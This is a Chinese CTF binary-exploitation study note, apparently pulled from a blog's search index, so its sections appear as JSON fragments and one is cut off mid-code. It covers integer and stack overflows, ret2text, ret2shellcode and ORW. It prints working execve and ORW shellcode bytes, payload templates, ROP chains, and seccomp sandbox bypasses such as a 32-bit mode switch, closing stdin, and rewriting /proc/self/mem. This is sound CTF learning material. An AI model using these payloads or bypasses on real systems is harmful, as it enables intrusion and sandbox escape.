初始化 TLS，遍历找到段调用brk为 TLS 数据和pthread结构体分配内存，然后初始化dtv数组， 创建线程时 TLS 初始化：pthread_create 调用 __pthread_create_2_1 函数，该函数中调用allocate_stack中的mmap 为线程分配栈空间，初始化栈底为一个 pthread 结构体并将指针 pd 指向该结构体。最后调用 _dl_allocate_tls 函数为 TCB 创建 dtv 数组， fs 寄存器不能在用户态修改 ","date":"2024-10-09","objectID":"/pwn_note/:6:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"终端处理 ① 只有echo命令 echo `\u003c/flag` # 将``包裹的子命令 /flag 内容输出到 echo 中读出 ② linux 存在一些内置命令：cd, echo, read, pwd, source，若没有cat等，可以通过以下代码在 shell 直接逐行查看文件内容 while IFS= read -r line; do echo \"$line\" done \u003c filename ③ 当使用rm删除某个文件后，可通过以下方法恢复 lsof | grep deletefile # 找到进程 cp /proc/self/fd/1 ~/deletefile.backup # self表示当前进程 [root@docking ~]# cd /proc/21796/fd [root@docking fd]# ll 总用量 0 lrwx------ 1 root root 64 1月 18 22:21 0 -\u003e /dev/pts/0 l-wx------ 1 root root 64 1月 18 22:21 1 -\u003e /root/deletefile.txt (deleted) lrwx------ 1 root root 64 1月 18 22:21 2 -\u003e /dev/pts/0 ④ 退格键应用 with open(\"a\", \"wb\") as f: f.write(b'abcdefg\\x08\\x08') # \\x08为退格键即backspace, 在linux中使用cat a时将只会读出abcde ","date":"2024-10-09","objectID":"/pwn_note/:7:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"随机数 ","date":"2024-10-09","objectID":"/pwn_note/:8:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"random time_t timer; struct tm *v3; int secret; timer = time(0LL); // 当前时间 v3 = localtime(\u0026timer); srandom(v3-\u003etm_yday); // 设置种子 为tm结构中的yday secret = random() // 种子数相同，多次得到的随机值相同 利用当前时间戳进行预测 from ctypes import cdll import time clib = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6') seed = int(time.time()) clib.srand(seed) pwd = clib.rand() ","date":"2024-10-09","objectID":"/pwn_note/:8:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"/dev/random // 基于物理设备噪声熵值 真随机 熵池不足会阻塞 random_file = fopen(\"/dev/random\", \"rb\"); // 打开系统/dev/random设备 fread(\u0026secret, 4uLL, 1uLL, random_file); // 读 1 个 4 字节的数据块，存入secret地址中 fclose(random_file); ","date":"2024-10-09","objectID":"/pwn_note/:8:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"arc4random // 基于 ARC4（Alleged RC4） 加密算法实现高质量伪随机数 无符号32位随机整数 // 操作系统中不显式初始化种子 secret = (unsigned int)arc4random() 若有循环函数及模数可以进行爆破 for i in range(num): num = i io.sendline(str(num)) result = io.recvline() if b\"xxx\" in result: break ","date":"2024-10-09","objectID":"/pwn_note/:8:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"整数溢出漏洞 下标溢出（越界）：程序未规定上下界，数字溢出，导致可以访问线性地址上内容 __isoc99_scanf(\"%u\", \u0026v1); // 未限制下标 now = (__int64)\u0026saves[8 * v1]; // 将saves数组外地址加载入now, 若能对now指向地址更改可任意地址写 漏洞点： int len; char buf[0x100]; scanf(\"%d\", \u0026len); read(0, buf, (unsigned int)len); // len转换为无符号整型, 则输入-1可以向buf输入极大数量的值 __isoc99_scanf(\"%d\", \u0026v4); read(0, *((void **)\u0026record + v4), 0x80uLL); // 通过构造v4进行任意地址写 memcpy 绕过 计算机中用补码存储有符号数，正数就是原码，负数需按位取反加一 _isoc99_scanf((unsigned int)\"%d\", (unsigned int)\u0026size); if ( size ) { if ( size \u003e 16 ) puts(\"Number out of range!\"); else memcpy(v, \u0026buf, size); # memcpy中的size 为 size_t # typedef unsigned long size_t; 即无符号整数 } 调试发现比较代码为： cmp eax, 10h # eax为32位 且此时将eax作为有符号整数看 计组知识 通过构造 size 为【作为有符号数是负数，作为无符号数为一个极大数】 输入 rax eax 有符号比较 无符号复制 -1 FFFF FFFF FFFF FFFF FFFF FFFF -1 \u003c 16 绕过但崩溃 -23923 FFFF FFFF FFFF A28D FFFF A28D -23923 \u003c 16 绕过 getshell 4294967200 0000 0000 FFFF FFA0 FFFF FFA0 -96 \u003c 16 绕过 getshell -2147483896 FFFF FFFF 7FFF FF08 7FFF FF08(第一位为 0 表正数) 2147483400 \u003e 16 未绕过崩溃 【调试方法】 根据相应汇编看寄存器的变化值，然后逆向使用 python 进行相反运算获取对应十六进制值再转换为十进制，最终可以根据调试构造出所需要的 size 大小，进而若有可控制的数组偏移如下，即可利用更改内存值 ","date":"2024-10-09","objectID":"/pwn_note/:9:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"栈溢出漏洞 ","date":"2024-10-09","objectID":"/pwn_note/:10:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"栈基础 函数调用栈在内存中从高地址向低地址生长，所以栈顶对应内存地址压栈时变小，退栈时变大 紧邻 ebp 的【stack frame pointer】保存父进程/函数的 ebp 地址 子函数的参数保存在父函数栈帧末尾，返回地址前的 arguments 中 函数调用栈 ebp：存储当前函数状态的基地址 esp：存储函数调用栈的栈顶地址 eip：存储即将执行的程序指令的地址 32 位栈的三层嵌套调用演示：main -\u003e func1 -\u003e func2 arg1,2,3 是 func1 函数的参数，但在 main 函数栈帧中 当局部变量是数组v[2]时，索引低的v[0]靠近 rsp，地址更低，索引高的v[1]靠近 rbp，地址更高 函数开头及结尾 push ebp\rmov ebp, esp\rleave\r#等价于 mov esp, ebp 有局部变量的情况\r# pop ebp\rretn\r#等价于 pop eip，实际没有该指令 压栈 被调用函数参数逆序压入栈内，esp→（arg1, arg2,…,argn） 将调用函数进行调用之后的下一条指令地址作为返回地址压入栈内，即调用函数的 eip 信息得以保存 （call xxx） 将当前的 ebp 的值（调用函数的基地址）压入栈内，将ebp 寄存器值更新为当前栈顶的地址，即 ebp 更新为被调用函数的基地址 被调用函数的局部变量压入栈内，只 esp 动 出栈 被调用函数局部变量栈内弹出，栈顶 esp 指向被调用函数的基地址 ebp 基地址内存储的调用函数的基地址从栈内弹出到 ebp 寄存器中，调用函数的 ebp 得以恢复，栈顶 esp 指向返回地址 传参 系统调用 syscall参数传递 x86_32：参数小于等于 6 个，ebx,ecx,edx,esi,edi,ebp 中；大于 6 个，全部参数放在一块连续内存区域，ebx 保存指向该区域的指针，eax 存系统调用号 使用int 0x80 x86_64：参数小于等于 6 个，rdi,rsi,rdx,r10,r8,r9；大于 6 个，全部参数放在一块连续内存区域，rbx 保存指向该区域的指针 使用syscall，rax 放每个 system call 函数对应的索引 函数 function参数传递 x86_32/x86：从右至左顺序压参数入栈，栈传递参数，eax 存放返回值 x86_64/amd64：参数少于 7 个时，从左到右：rdi,rsi,rdx,rcx,r8,r9 中，大于 7 个，后面的从“右向左”放入栈中 ","date":"2024-10-09","objectID":"/pwn_note/:10:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"OOB Out-of-Bounds，包括数组越界、指针偏移、使用后释放 UAF 等 写后判断 通过该漏洞可以造成越界写内容，若 arg_list 在 bss 段可以借此越界改其他 bss 段上的变量 while ( 1 ){ next_args = strtok(0LL, \" \"); // 获取命令行输入参数遍历 if ( !next_args ) break; if ( strlen(next_args) \u003e 31 ){return -1;} i = nargs++; strcpy(\u0026arg_list[32 * i], next_args); // 漏洞点: 先写入arg_list再判断是否大于10 } if ( nargs \u003c= 10 ){ return idx;} else{return -1;} 调用越界 先任意写入 system 地址到 bss 段，尝试越界修改 bss 段中 idx 使得偏移调用 system 函数 arg_list也可尝试任意地址写入'/bin/sh' 注意有时p64(0xab)时使用replace(b'\\x00', b'')或p64(0x123456781234)[:6]替换防止提前 0 截断 ((void (__fastcall *)(char *))*(\u0026funcs_list + 3 * idx))(arg_list); ","date":"2024-10-09","objectID":"/pwn_note/:10:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"地址泄露 read 漏洞点 无 canary 时，下述代码泄露栈地址，构造payload=b'a'*0x30，接收 48 个 a 后会泄露出后续栈地址内容 char buf[48]; // [rsp+0h] [rbp-30h] BYREF read(0, buf, 0x40uLL); // 末尾不为0则打印出后续内容 printf(\"%s\", buf); 无截断泄露 len = read(0, input, size); if( *(input+len-1) == '\\n') // 最后一个值不传入\\n *(input+len-1)=0; command_name = strtok(input, \" \"); printf(\"%s\", command_name); // 结尾无\\0截断可泄露后续栈地址或进程基址或libc[_IO_2_1_stderr_]地址 栈溢出逻辑漏洞点 for(int i=0; i \u003c= len; i++) // 循环i+1次 循环完后，使用循环变量造成越界 for(i=0; i \u003c sizeof(buf); i++) { ... } buf[i] = 0; // off by null ","date":"2024-10-09","objectID":"/pwn_note/:10:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ret2text 退栈过程，返回地址会传给 eip，让溢出数据用攻击指令的地址覆盖返回地址 攻击指令的地址一般为用户中存在的后门函数地址，即已存在 （考虑最简单情况 canary 并未保护，则 stack frame pointer 和局部变量之间没有 canary 的随机值） 漏洞点 char buffer[8]; // [esp+8h] [ebp-10h] 距离ebp 16字节, 距离esp 8字节 =\u003e 8字节缓冲区 gets(buffer); 32 位 # 覆盖返回地址 payload = b'a'*padding + p32(execve_plt_addr) + p32(ret_addr) + p32(arg1) + p32(arg2) + p32(arg3) # arg1:/bin/sh_addr # arg2:argv[] = 0 # arg3:envp[] = 0 # ret_addr可随意填写, 指代execve函数执行后的返回地址 有后门函数：覆盖完缓冲区 padding 字节，覆盖 ebp 的值 4 字节，最后覆盖返回地址 payload = b'A' * padding + b'BBBB' + p32(backdoor_addr) # 后门函数使用elf.symbols['函数名'] 64 位 可能会遇到RSP 16字节对齐问题，可以使用两种方法来达成目的： 将后门函数地址+1 来跳过push rbp调整 rsp 栈帧，前提是后门函数第一个指令为push rbp，指令长度 1 字节 在后门函数地址前加入ret指令地址调整 rsp 栈帧 ","date":"2024-10-09","objectID":"/pwn_note/:10:4","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ret2shellcode 无后门函数且栈可执行时，使用 ret2shellcode shellcode 汇编 .intel_syntax noprefix\r.text\r.globl _start\r.type _start, @function\r_start:\rxxx\rxxx 生成 shellcode gcc -c start.s -o start.o ld -e _start -z noexecstack start.o -o start 可以在 shellcode 数据库 寻找适合的 shellcode xchg edi, eax ; 交换两个寄存器值, 比 mov 机器码短 32 位 21 字节 shellcode： shellcode = asm(\"\"\" push 0x68732f push 0x6e69622f mov ebx,esp xor ecx,ecx xor edx,edx push 11 pop eax int 0x80 \"\"\") 无\\x00截断，21 字节 \\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80 41 字节 scanf 可读取 \\xeb\\x1b\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x29\\xc0\\xaa\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x29\\xc0\\xab\\xb0\\x08\\x04\\x03\\xcd\\x80\\xe8\\xe0\\xff\\xff\\xff/bin/sh 64 位 22 字节 shellcode： shellcode = asm(\"\"\" mov rbx, 0x68732f6e69622f push rbx push rsp pop rdi xor esi,esi xor edx,edx push 0x3b pop rax syscall \"\"\") 23 字节 shellcode： \\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05 shellcode = b\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\" xor esi, esi ; 将寄存器 esi 清零 \\x31\\xf6 mov rbx, 0x68732f2f6e69622f ; 将字符串 \"/bin//sh\" 存入寄存器 rbx push 0x54 ; 将字符串 \"/bin//sh\" 压入栈中 push 0x53 ; \\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68 push rbx ; 将字符串 \"/bin//sh\" 压入栈中 \\x56\\x53\\x54 pop rdi ; 将栈顶元素弹出并存入寄存器 rdi \\x5f push 0x3b ; 将系统调用号（sys_execve）压入栈中 \\x6a\\x3b pop rax ; 将栈顶元素弹出并存入寄存器 rax \\x58 xor edx, edx ; 将寄存器 edx 清零 \\x31\\xd2 syscall ; 执行系统调用 \\x0f\\x05 无\\x00截断且 scanf 可读，22 字节 \\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05 栈上 shellcode 漏洞点 char buf; // [esp+0h] [ebp-88h] read(0, \u0026buf, 0x100u); ((void)buf)(arg1); // 执行shellcode 先将 shellcode 写入栈缓冲区，然后篡改返回地址为手动传入的 shellcode 所在缓冲区地址 payload = shellcode + b'\\x90' * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr) # 填充 # buf_addr即shellcode地址 # \\x90: Nop 由于the NX bits保护措施，栈缓冲区不可执行 改为向bss 缓冲区（默认可执行）或向堆缓冲区写入 shellcode 并使用mprotect赋予其可执行权限 修改某地址为可执行后可以通过 rop 构造 call rax/rdi 中存储的该地址来执行 payload = p64(pop_rax_ret_addr) + p64(rw_memory) + p64(call_rax_addr) mprotect(\u0026GLOBAL_OFFSET_TABLE_, size, 7); // 将全局偏移表所在的size大小的内存区域的权限设置为可读、可写和可执行 mprotect：修改一段指定内存区域的保护属性，绕过 NX #include \u003cunistd.h\u003e #include \u003csys/mmap.h\u003e int mprotect(const void *start, size_t len, int prot); // start开始长度len的内存区保护属性改为prot指定值 // 可用“|”将几个属性合起来使用, 指定内存区间必须包含整个内存页（4K） 成功返回0, 失败返回-1 // PROT_READ:内容可写; PROT_WRITE:内容可读; PROT_EXEC:可执行; PROT_NONE:内容不可访问 payload 构造时 # start位置通过下列操作对齐 buf_addr \u0026 ~0xFFF bss 段上 shellcode char s; // [esp+1Ch] [ebp-64h] gets(\u0026s); strncpy(buf2, \u0026s, 0x64u); //buf2为未初始化的全局变量，在bss中 //复制字符串，从s指向的地址复制0x64u的字符数到buf2中 return address 0x4 previous ebp 0x4 ebp s 0x64 esp 而 IDA 有的时候不可靠，需要依靠 gdb 动态调试判断真实的 buf 与 ebp 之间的距离 构造的 payload 使用 gets 函数覆盖 s，ebp 和返回地址，返回地址覆盖为 shellcode 地址，shellcode 由 strncpy 函数从 s 中复制到 bss 段中的 buf2 中；于是返回地址覆盖为 buf2 中 shellcode 地址。 输入同样的 exp 后执行失败，由于高版本 linux 中程序 bss 段不再默认可执行导致出错，查看方法： gdb 中 vmmap 找到对应的 bss 段，buf2 地址为 0x804a080，不可执行 由于服务器一定开启了 ASLR，所以返回地址并不一定得覆盖为 shellcode 地址，因为不能确定所以需要使用【Nop 滑梯】 shellcode 技巧 ① 当前方执行完 read 函数就执行 shellcode，且此时输入极少 read(0, (void *)0x20240000, 0xDuLL); mov edx, 0Dh ; nbytes mov esi, 20240000h ; buf mov edi, 0 ; fd call _read MEMORY[0xdead](); ... // esi和edi未被改变 call rdx 可以输入以下绕过： bypass = asm(\"\"\" mov rdx, 0x1000 syscall ; 再次read系统调用再送入一次shellcode执行 \"\"\") ② 可见字符 Shellcode if ( buf[i] \u003c= 31 || buf[i] == 127 ) // 仅允许输入可见字符的Shellcode 使用工具AE64 from ae64 import AE64 s = shellcraft # 使用ORW shellcode = s.open('./flag') shellcode += s.read(3,0x20240000,30) shellcode += s.write(1,0x20240000,30) ss = AE64().encode(asm(shellcode),'rdx',0,'fast') # arg: shellcode, 寄存器: call rdx, 偏移, 策略:fast or small print(ss) // 测试 int main(){ char shellcode[]=\"visible_shellcode\"; void(*run)()=(void(*)())shellcode; //run函数指针,无参无返回值; 将shellcode转换为函数指针 run(); } ③ 侧信道攻击 传入极少字节 shellcode，已知 rdi 寄存器存放泄露内容 flag 或已通过 open 与 read 读到 rdi 或 rsp 中 flag = b'' i = 0 j = string.printable while True: for k in j: try: io = process(\"./elf\") payload = f\"\"\" xor byte ptr [rdi+{i}], {j} jz $ \"\"\" shell","date":"2024-10-09","objectID":"/pwn_note/:10:5","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"orw bypass Open syscall shellcode # open调用 21字节 ret会进入0x67616c66出错 context(arch=\"amd64\") shellcode = asm(\"\"\" mov rdi, 0x67616c66 /* 'flag'*/ push rdi mov rdi, rsp xor esi, esi /* O_RDONLY = 0 */ mov eax, 0x2 syscall ret \"\"\") # open调用 21字节 ret 会返回源程序 shellcode2 = asm(\"\"\" lea rdi, [rip+flag] xor esi, esi /* O_RDONLY = 0 */ mov eax, 0x2 /* open syscall */ syscall ret /* 为了返回源程序 */ flag: .ascii \"flag\" \"\"\") # 使用该情况要注意shellcode前后影响因素，flag后加入b'\\x00'及前方加入b'\\x90'(nop) ORW addr = 0xdead flag_addr = addr + 0x100 # flag硬写入内存中 shellcode = f\"\"\" mov rax, 2 mov rdi, {flag_addr} mov rsi, 0 syscall xor rax, rax mov rdi, 3 mov rsi, {flag_addr} mov rdx, 0x40 syscall mov rax, 1 mov rdi, 1 syscall \"\"\" pay = b'\\x90'*0x10 + asm(shellcode) # 第二次读需要重新覆盖前面0x10地址 payload = pay.ljust(0x100, b'\\x90') + b'/flag\\x00\\x00\\x00' # 可能需要gdb微调在前后加\\x00或\\x90使刚好对应地址读取flag而不是flagxx 通过 ROP 使用 orw 读 flag 操作 read(0,free_hook,4) //需要输入flag，替代free_hook地址 //栈：pop_rdi_ret 0 pop_rsi_ret free_hook_addr pop_rdx_ret 4 read_addr open(free_hook,0) //打开flag read(3,free_hook,100) //读flag puts(free_hook) //输出flag 读 flag 到某个地方 libc.['environ']，是libc存储的栈地址 libc的bss段，将libc放入IDA中查看即可 __free_hook ，__free_hook是全局变量，可直接被修改 其余绕过 ① 禁用 SYS_open ，用 SYS_openat 代替 /* # define __NR_openat 257 rax # define AT_FDCWD -100 rdi # define O_RDONLY 00 rdx */ int fd = syscall(__NR_openat, AT_FDCWD, \"flag\", O_RDONLY); libc 中的 open 函数底层实现调用的是 openat 系统调用 /* Open FILE with access OFLAG. If O_CREAT or O_TMPFILE is in OFLAG, a third argument is the file protection. */ int __libc_open64(const char *file, int oflag, ...) { int mode = 0; if (__OPEN_NEEDS_MODE(oflag)) { va_list arg; va_start(arg, oflag); mode = va_arg(arg, int); va_end(arg); } return SYSCALL_CANCEL(openat, AT_FDCWD, file, oflag | EXTRA_OPEN_FLAGS, mode); } ② strlen获取 shellcode 长度，可采取\\x00开头的指令截断绕过长度判断 00 40 00 add BYTE PTR [rax+0x0], al 00 41 00 add BYTE PTR [rcx+0x0], al 00 42 00 add BYTE PTR [rdx+0x0], al 00 43 00 add BYTE PTR [rbx+0x0], al 00 45 00 add BYTE PTR [rbp+0x0], al 00 46 00 add BYTE PTR [rsi+0x0], al 00 47 00 add BYTE PTR [rdi+0x0], al ③ 4 字节系统调用号绕过 当所有可利用系统调用号被禁了，但由于无判断sys_number \u003e= 0x40000000的情况，因此可以通过0x40000000|sys_number来绕过，sys_number为 64 位的系统调用号 ④ 沙箱缺少对架构的判断 白名单只允许read, write, brk, mprotect, fstat函数，64 位下fstat调用号与 32 位下open调用号相同 可以切换到 32 位下调用open系统通过调用，x86 架构的 CPU 根据CS 段寄存器对应的段描述符中的属性确定访问指令是 32 还是 64 位 32 位 CS 为 0x23，64 位 CS 为 0x33 rdi 寄存器需要指向 shellcode 地址，shellcode 地址需要小于 0x100000000，rsp 需要小于 0x100000000 下为 shellcode 内容： # 切换到32位 payload1 = ''' mov rsp, 0x404000+0x500 # 地址位于中间, 不超过4字节 mov r8, 0x23 shl r8, 0x20 # 0x23进入高32位下 mov rax, rdi # 赋给rax shellcode地址 add rax, 0x1e # payload1的长度, rax指向payload2起始地址 or rax, r8 # rax高32位为0x23，低32位为payload2起始地址 push rax retf # 读取栈上前8字节，低4字节作为跳转地址，高4字节作为新的CS ''' shellcode += asm(payload1, arch='amd64', bits=64) info(\"shellcode1: \" + hex(len(asm(payload1, arch='amd64', bits=64)))) # 0x1e payload2 = ''' mov edx, eax # payload2起始地址 push 0x1010101 xor dword ptr [esp], 0x1016660 # 得到0x6761:ga push 0x6c662f2e # lf/. # ./flag mov ebx, esp # ./flag 字符串地址 xor ecx, ecx mov eax, 5 int 0x80 # open('./flag', 0) push 0x33 add edx, 0x25 # payload2长度 push edx # 高32位为0x33，低32位为payload3起始地址 retf ''' shellcode += asm(payload2, arch='i386', bits=32) info(\"shellcode2: \" + hex(len(asm(payload2, arch='i386', bits=32)))) payload3 = ''' mov rdi,rax # 3 mov rsi,rsp # rsp为flag字符串地址 mov edx,0x100 xor eax,eax syscall # read(3, addr, 0x100) mov edi,1 mov rsi,rsp push 1 pop rax syscall # write(1, addr, 0x100) ''' shellcode += asm(payload3, arch='amd64', bits=64) ⑤ close 绕过 fd 参数检查 禁用open、execve，允许exit_group，若为read：fd 只能为 0 绕过：openat 代替 open，通过将stdin 关闭绕过 fd 检查，打开文件返回的句柄 fd 则为 0 A = fd \u003e\u003e 32 if (A != 0x0) goto 0016 # return KILL rop += p64(elf.search(asm('pop rax; ret;'), executable=True).__next__()) rop += p64(3) rop += p64(elf.search(asm('pop rdi; ret;'), executable=True).__next__()) rop += p64(0) rop += p64(elf.search(asm('syscall; ret;'), executable=True).__next__()) # close 64 位 ORW_ROP，栈迁移到写入 rop 的地址 payload += p64(pop_rdi)","date":"2024-10-09","objectID":"/pwn_note/:10:6","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"沙箱绕过 ","date":"2024-10-09","objectID":"/pwn_note/:11:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Seccomp Sandbox，限制 execve 导致不能使用 onegadget 和 system 调用，一般两种方式开启沙箱 PR_SET_SECCOMP是 linux 内核提供的一种机制，限制进程可执行的系统调用，可通过prctl()系统调用设置（可以通过PR_SET_SECCOMP设置进程的 seccomp 过滤器或PR_SET_NO_NEW_PRIVS设置进程的no_new_privs标志 seccomp 过滤器通过 BPF(Berkeley Packet Filter)程序实现，可以过滤进程所发起的系统调用并限制；seccomp 过滤器只在进程启动时设置，一旦设置不可修改 PR_SET_NO_NEW_PRIVS标志可禁止进程获取更高权限，防止进程提权 采用 prctl 函数调用 使用 seccomp 库函数 编写沙箱规则保存在rule文件中 A = arch A == ARCH_X86_64 ? next : kill A = sys_number A \u003e= 0x40000000 ? kill : next A == execve ? kill : allow allow: return ALLOW kill: return KILL 通过seccomp-tools将规则转换为可被PR_SET_SECCOMP识别的规则 $ seccomp-tools asm rule -a amd64 -f raw | hexdump $ seccomp-tools asm rule -a amd64 -f raw | seccomp-tools disasm - line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x04 0xc000003e if (A != ARCH_X86_64) goto 0006 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x02 0x00 0x40000000 if (A \u003e= 0x40000000) goto 0006 0004: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x06 0x00 0x00 0x00000000 return KILL 将规则应用于 C 程序中 #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003clinux/seccomp.h\u003e #include \u003csys/prctl.h\u003e #include \u003clinux/filter.h\u003e int main() { // 定义过滤器规则 存放机器码 struct sock_filter filter[] = { {0x20, 0x00, 0x00, 0x00000004}, {0x15, 0x00, 0x04, 0xc000003e}, {0x20, 0x00, 0x00, 0x00000000}, {0x35, 0x02, 0x00, 0x40000000}, {0x15, 0x01, 0x00, 0x0000003b}, {0x06, 0x00, 0x00, 0x7fff0000}, {0x06, 0x00, 0x00, 0x00000000} }; struct sock_fprog prog = { .len = (unsigned short) (sizeof(filter) / sizeof(filter[0])), // 过滤器长度 .filter = filter, }; // 确保进程无法获取新的权限 prctl(PR_SET_NO_NEW_PRIVS, SECCOMP_MODE_STRICT, 0LL, 0LL, 0LL); // 设置seccomp过滤器 if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, \u0026prog) == -1) { perror(\"[-] prctl error.\"); return 1; } // 执行系统调用 将会失败 char *args[] = {\"/bin/bash\", \"-i\", NULL}; execve(args[0], args, NULL); return 0; } prctl——系统调用，控制和修改进程的行为和属性，决定系统调用 #include \u003csys/prctl.h\u003e int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5); IDA显示 prctl(38, 1LL, 0LL, 0LL, 0LL); // arg1: #define PR_SET_NO_NEW_PRIVS 38 // arg2: no_new_privs=1 无法使用execve() 继承到子进程 prctl(22, 2LL, \u0026v); // arg1: #define PR_SET_SECCOMP 22 // arg2: #define SECCOMP_MODE_FILTER 2 BPF过滤:对syscall的限制通过arg3的Berkeley Packet Filter相关结构体定义 使用 Seccomp 创建 Seccomp // gcc test.c -o test -lseccomp #include \u003cunistd.h\u003e #include \u003cseccomp.h\u003e int main() { // 创建过滤器上下文 scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_ALLOW); // 默认allow // 添加过滤规则 seccomp_arch_add(ctx, SCMP_ARCH_X86_64); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0); seccomp_load(ctx); // 执行系统调用 char *args[] = {\"/bin/bash\", \"-i\", NULL}; execve(args[0], args, NULL); return 0; } seccomp_arch_add函数 int seccomp_rule_add(scmp_filter_ctx ctx, uint32_t action, int syscall, unsigned int arg_cnt, ...); // ctx: 过滤器上下文，存储过滤规则 // action: 规则匹配时的操作:SCMP_ACT_ALLOW允许系统调用, SCMP_ACT_KILL杀死进程, SCMP_ACT_ERRNO返回错误码并允许系统调用 // syscall: 限制的系统调用号 // arg_cnt: 要匹配的参数数量 // ...: 指定要匹配的参数值, 每个参数一个scmp_arg_cmp结构体, 包含参数比较方法和比较值 scmp_arg_cmp结构体 struct scmp_arg_cmp { unsigned int arg; /**\u003c argument number, starting at 0 要比较的参数序号*/ enum scmp_compare op; /**\u003c the comparison op 比较方式 */ /** SCMP_CMP_NE: 不等于 SCMP_CMP_EQ: 等于 SCMP_CMP_LT: 小于 SCMP_CMP_LE: 小于等于 SCMP_CMP_GT: 大于 SCMP_CMP_GE: 大于等于 SCMP_CMP_MASKED_EQ: 按位与后等于 **/ scmp_datum_t datum_a; // 用来于参数比较的值 scmp_datum_t datum_b; }; 如： // 规定 read 必须从标准输入读取不超过 BUF_SIZE 的内容到 buf 中 #define BUF_SIZE 0x100 char buf[BUF_SIZE]; seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 3, SCMP_A0(SCMP_CMP_EQ, fileno(stdin)), SCMP_A1(SCMP_CMP_EQ, (scmp_datum_t) buf), SCMP_A2(SCMP_CMP_LE, BUF_SIZE)); seccomp // IDA 中显示 v = seccomp_init(111LL); // 初始化，参数表示用于过滤的操作模式 seccomp_rule_add(v, 0LL, 59LL, 0LL); // 禁用59系统调用号execve seccomp_load(v); // 加载过滤器 绕过：查看 ret2syscall 中 orw bypass ","date":"2024-10-09","objectID":"/pwn_note/:11:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"/proc 泄露 保护全开，提供open，read，write，lseek函数 open: O_RDONLY 00000000 O_WRONLY 00000001 O_RDWR 00000002 lseek函数：在文件中移动文件指针的位置 off_t lseek(int fd, off_t offset, int whence);// 返回文件指针偏移值 或 -1 // fd: 文件描述符 offset: 相对于whence的偏移量 // whence: 文件指针基准位置【SEEK_SET 0 开头, SEEK_CUR 1 当前, SEEK_END 2 结尾】 /proc 文件系统 Linux 内核提供的一种伪文件系统，运行时可访问、设置内核内部数据结构，只存在内存中，不占外存空间 /proc/self/maps: 得到当前进程内存映射关系，等价于 pwndbg 中的vmmap，open 只可读，可获取内存代码段基址 pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555555000 r--p 1000 0 /home/zhou/pwn // 0x555555554000 即为文件基址 /proc/self/mem: 进程内存内容，open 可读可写，修改该文件等效于直接修改当前进程内存 绕过利用 // open时文件包含flag将会报错 if ( strstr(filename, \"flag\") ){ // filename中查找第一次出现\"flag\"的位置 exit(0); } // IDA .rodata:000000000000216C needle db 'flag',0 ; DATA XREF: Open+4D↑o 通过打开/proc/self/maps文件泄露基址，IDA 中确定字符串偏移 用 lseek 修改文件指针进行读取修改，写入/proc/self/mem将’flag’更改为别的字符串绕过检查 ","date":"2024-10-09","objectID":"/pwn_note/:11:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Ptrace 进程 __WAIT_STATUS // 定义了__WAIT_STATUS [union: 共用同一块内存,兼容系统] typedef union { // 都用于表示进程状态 union wait *__uptr; // 早期系统 指向 union wait 类型的指针 int *__iptr; // 现代系统 指向 int 类型的指针 } __WAIT_STATUS __attribute__ ((__transparent_union__)); // IDA __WAIT_STATUS stat_loc; // 